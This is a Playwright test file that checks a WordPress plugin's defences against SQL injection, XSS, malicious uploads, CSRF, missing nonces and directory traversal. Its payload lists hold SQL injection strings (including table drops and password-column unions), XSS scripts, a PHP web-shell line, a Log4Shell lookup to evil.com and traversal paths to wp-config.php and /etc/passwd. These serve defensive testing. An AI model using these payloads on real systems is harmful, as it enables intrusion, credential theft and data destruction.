import { test, expect } from '@playwright/test';

test.describe('Security Tests - SQL Injection & XSS Prevention', () => {
  test.use({ storageState: 'tests/.auth/admin.json' });

  test.describe('SQL Injection Prevention', () => {
    test('should prevent SQL injection in search fields', async ({ page }) => {
      await page.goto('/wp-admin/edit.php?post_type=mt_candidate');
      
      // Common SQL injection payloads
      const sqlPayloads = [
        "' OR '1'='1",
        "1' OR '1' = '1",
        "' OR 1=1--",
        "admin' --",
        "' UNION SELECT * FROM wp_users--",
        "'; DROP TABLE wp_mt_evaluations; --",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
      ];
      
      for (const payload of sqlPayloads) {
        // Try injection in search field
        await page.fill('#post-search-input', payload);
        await page.click('#search-submit');
        
        // Page should not error out
        await expect(page.locator('body')).not.toContainText('database error');
        await expect(page.locator('body')).not.toContainText('mysql');
        await expect(page.locator('body')).not.toContainText('syntax error');
        
        // Should show no results or sanitized search
        const results = page.locator('.no-items, .wp-list-table tbody tr');
        await expect(results).toBeVisible();
      }
    });

    test('should prevent SQL injection in AJAX requests', async ({ page }) => {
      await page.goto('/wp-admin/admin.php?page=mt-assignments');
      
      // Test SQL injection in AJAX parameters
      const sqlPayloads = [
        "1 OR 1=1",
        "1'; DROP TABLE test; --",
        "1 UNION SELECT user_pass FROM wp_users"
      ];
      
      for (const payload of sqlPayloads) {
        const response = await page.evaluate(async (injection) => {
          const formData = new FormData();
          formData.append('action', 'mt_get_candidate_data');
          formData.append('candidate_id', injection);
          formData.append('nonce', (window as any).mt_ajax?.nonce || '');
          
          const result = await fetch('/wp-admin/admin-ajax.php', {
            method: 'POST',
            body: formData
          });
          
          return {
            status: result.status,
            text: await result.text()
          };
        }, payload);
        
        // Should return error or empty result, not database error
        expect(response.status).toBe(200); // WordPress returns 200 even for AJAX errors
        expect(response.text).not.toContain('database error');
        expect(response.text).not.toContain('mysql');
      }
    });

    test('should use prepared statements for database queries', async ({ page }) => {
      await page.goto('/wp-admin/admin.php?page=mt-debug-center&tab=security');
      
      // Check for prepared statement usage indicators
      const securityInfo = page.locator('.security-audit');
      if (await securityInfo.isVisible()) {
        const auditText = await securityInfo.textContent();
        
        // Should mention prepared statements or parameter binding
        expect(auditText?.toLowerCase()).toContain('prepared');
      }
    });

    test('should sanitize form inputs before database operations', async ({ page }) => {
      await page.goto('/wp-admin/admin.php?page=mt-assignments');
      
      // Try to inject SQL via form submission
      const jurySelect = page.locator('select[name="jury_member_id"]');
      const candidateSelect = page.locator('select[name="candidate_id"]');
      
      if (await jurySelect.isVisible() && await candidateSelect.isVisible()) {
        // Manipulate form values via JavaScript
        await page.evaluate(() => {
          const form = document.querySelector('form');
          if (form) {
            // Try to inject malicious values
            const hiddenInput = document.createElement('input');
            hiddenInput.type = 'hidden';
            hiddenInput.name = 'jury_member_id';
            hiddenInput.value = "1' OR '1'='1";
            form.appendChild(hiddenInput);
          }
        });
        
        await page.click('button[type="submit"]');
        
        // Should show validation error, not database error
        await expect(page.locator('.notice-error, .error')).toBeVisible();
        await expect(page.locator('body')).not.toContainText('database error');
      }
    });
  });

  test.describe('XSS Prevention', () => {
    test('should prevent XSS in candidate names', async ({ page }) => {
      await page.goto('/wp-admin/post-new.php?post_type=mt_candidate');
      
      // XSS payloads
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<body onload=alert("XSS")>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>'
      ];
      
      for (const payload of xssPayloads) {
        // Try to inject XSS in title field
        await page.fill('#title', payload);
        await page.fill('#content', 'Test content');
        
        // Save as draft
        await page.click('#save-post');
        await page.waitForLoadState('networkidle');
        
        // Check that script is not executed
        const alertPromise = page.waitForEvent('dialog', { timeout: 1000 })
          .then(() => true)
          .catch(() => false);
        
        const hadAlert = await alertPromise;
        expect(hadAlert).toBeFalsy();
        
        // Check that content is escaped in the saved post
        const titleField = page.locator('#title');
        const savedTitle = await titleField.inputValue();
        expect(savedTitle).not.toContain('<script>');
        expect(savedTitle).not.toContain('javascript:');
      }
    });

    test('should prevent XSS in evaluation comments', async ({ page }) => {
      await page.context().storageState({ path: 'tests/.auth/jury.json' });
      await page.goto('/jury-dashboard/');
      
      const evaluateLink = page.locator('.evaluate-candidate').first();
      if (await evaluateLink.isVisible()) {
        await evaluateLink.click();
        
        // XSS payload in comments
        const xssComment = '<script>alert("XSS in comment")</script><img src=x onerror=alert(1)>';
        await page.fill('textarea[name="comments"]', xssComment);
        
        // Fill required fields
        await page.fill('input[name="criterion_1"]', '5');
        await page.fill('input[name="criterion_2"]', '5');
        await page.fill('input[name="criterion_3"]', '5');
        await page.fill('input[name="criterion_4"]', '5');
        await page.fill('input[name="criterion_5"]', '5');
        
        await page.click('button[name="save_draft"]');
        
        // No alert should appear
        const alertPromise = page.waitForEvent('dialog', { timeout: 1000 })
          .then(() => true)
          .catch(() => false);
        
        const hadAlert = await alertPromise;
        expect(hadAlert).toBeFalsy();
        
        // Reload and check that comment is escaped
        await page.reload();
        const commentField = page.locator('textarea[name="comments"]');
        const savedComment = await commentField.inputValue();
        expect(savedComment).not.toContain('<script>');
      }
    });

    test('should escape output in templates', async ({ page }) => {
      await page.goto('/wp-admin/edit.php?post_type=mt_candidate');
      
      // Check that all output is properly escaped
      const htmlElements = await page.locator('*').allInnerTexts();
      
      for (const text of htmlElements) {
        // Should not contain unescaped HTML tags in text content
        expect(text).not.toMatch(/<script[^>]*>.*<\/script>/i);
        expect(text).not.toMatch(/<iframe[^>]*>/i);
        expect(text).not.toContain('javascript:');
      }
    });

    test('should validate file uploads', async ({ page }) => {
      await page.goto('/wp-admin/admin.php?page=mt-import-export');
      
      const fileInput = page.locator('input[type="file"]');
      if (await fileInput.isVisible()) {
        // Try to upload a file with malicious extension
        const maliciousFiles = [
          { name: 'test.php', content: '<?php system($_GET["cmd"]); ?>' },
          { name: 'test.exe', content: 'MZ' }, // EXE header
          { name: 'test.js', content: 'alert("XSS")' },
          { name: 'test.html', content: '<script>alert("XSS")</script>' }
        ];
        
        for (const file of maliciousFiles) {
          // Create a file with malicious extension
          await page.setInputFiles('input[type="file"]', {
            name: file.name,
            mimeType: 'application/octet-stream',
            buffer: Buffer.from(file.content)
          });
          
          // Try to upload
          const uploadButton = page.locator('button:has-text("Upload")');
          if (await uploadButton.isVisible()) {
            await uploadButton.click();
            
            // Should show error for invalid file type
            await expect(page.locator('.notice-error, .error-message')).toBeVisible();
            const errorText = await page.locator('.notice-error, .error-message').textContent();
            expect(errorText?.toLowerCase()).toContain('file type');
          }
        }
      }
    });
  });

  test.describe('Authentication & Authorization', () => {
    test('should enforce nonce verification on AJAX requests', async ({ page }) => {
      await page.goto('/wp-admin/admin.php?page=mt-dashboard');
      
      // Try AJAX request without nonce
      const response = await page.evaluate(async () => {
        const formData = new FormData();
        formData.append('action', 'mt_save_evaluation');
        // Intentionally omit nonce
        
        const result = await fetch('/wp-admin/admin-ajax.php', {
          method: 'POST',
          body: formData
        });
        
        return {
          status: result.status,
          text: await result.text()
        };
      });
      
      // Should fail due to missing nonce
      expect(response.text).toContain('error');
      expect(response.text.toLowerCase()).toMatch(/nonce|security|unauthorized/);
    });

    test('should enforce capability checks', async ({ page }) => {
      // Login as subscriber (lowest role)
      await page.goto('/wp-login.php');
      await page.fill('#user_login', 'subscriber_test');
      await page.fill('#user_pass', 'Test123!');
      
      // Try to access admin pages
      const restrictedPages = [
        '/wp-admin/admin.php?page=mt-assignments',
        '/wp-admin/admin.php?page=mt-evaluations',
        '/wp-admin/admin.php?page=mt-import-export'
      ];
      
      for (const restrictedPage of restrictedPages) {
        await page.goto(restrictedPage);
        
        // Should be denied access
        const bodyText = await page.locator('body').textContent();
        expect(bodyText?.toLowerCase()).toMatch(/denied|permission|authorized|sorry/);
      }
    });

    test('should prevent CSRF attacks', async ({ page }) => {
      await page.goto('/wp-admin/admin.php?page=mt-assignments');
      
      // Check that forms have nonce fields
      const forms = page.locator('form');
      const formCount = await forms.count();
      
      for (let i = 0; i < formCount; i++) {
        const form = forms.nth(i);
        const nonceField = form.locator('input[name*="nonce"], input[name*="_wpnonce"]');
        const hasNonce = await nonceField.count() > 0;
        
        // All forms should have nonce fields
        expect(hasNonce).toBeTruthy();
      }
    });

    test('should sanitize and validate all user inputs', async ({ page }) => {
      await page.goto('/wp-admin/admin.php?page=mt-evaluations');
      
      // Test various malicious inputs
      const maliciousInputs = [
        '<script>alert(1)</script>',
        '../../etc/passwd',
        'http://evil.com/steal.php',
        '%00',
        '\x00',
        '${jndi:ldap://evil.com/a}'
      ];
      
      for (const input of maliciousInputs) {
        // Try in different input fields
        const inputFields = page.locator('input[type="text"], textarea');
        const fieldCount = await inputFields.count();
        
        if (fieldCount > 0) {
          await inputFields.first().fill(input);
          
          // Submit form if available
          const submitButton = page.locator('button[type="submit"], input[type="submit"]').first();
          if (await submitButton.isVisible()) {
            await submitButton.click();
            
            // Should not cause security issues
            await expect(page.locator('body')).not.toContainText('error');
            await expect(page).not.toHaveURL(/error|forbidden/);
          }
        }
      }
    });

    test('should protect against directory traversal', async ({ page }) => {
      // Test file access with directory traversal attempts
      const traversalPayloads = [
        '../../../wp-config.php',
        '..\\..\\..\\wp-config.php',
        '....//....//....//wp-config.php',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fwp-config.php'
      ];
      
      for (const payload of traversalPayloads) {
        const response = await page.evaluate(async (path) => {
          const formData = new FormData();
          formData.append('action', 'mt_get_file');
          formData.append('file', path);
          formData.append('nonce', (window as any).mt_ajax?.nonce || '');
          
          const result = await fetch('/wp-admin/admin-ajax.php', {
            method: 'POST',
            body: formData
          });
          
          return {
            status: result.status,
            text: await result.text()
          };
        }, payload);
        
        // Should not expose sensitive files
        expect(response.text).not.toContain('DB_PASSWORD');
        expect(response.text).not.toContain('wp-config');
      }
    });

    test('should implement rate limiting for sensitive operations', async ({ page }) => {
      await page.goto('/wp-admin/admin.php?page=mt-evaluations');
      
      // Try rapid-fire requests
      const requests = [];
      for (let i = 0; i < 20; i++) {
        requests.push(page.evaluate(async () => {
          const formData = new FormData();
          formData.append('action', 'mt_save_evaluation');
          formData.append('nonce', (window as any).mt_ajax?.nonce || '');
          
          const result = await fetch('/wp-admin/admin-ajax.php', {
            method: 'POST',
            body: formData
          });
          
          return result.status;
        }));
      }
      
      const results = await Promise.all(requests);
      
      // Some requests should be rate-limited (429) or show throttling
      const throttled = results.filter(status => status === 429 || status === 503);
      // At least some requests should be throttled if rate limiting is implemented
      // This is a soft check as rate limiting might not be implemented
      if (throttled.length > 0) {
        expect(throttled.length).toBeGreaterThan(0);
      }
    });
  });
});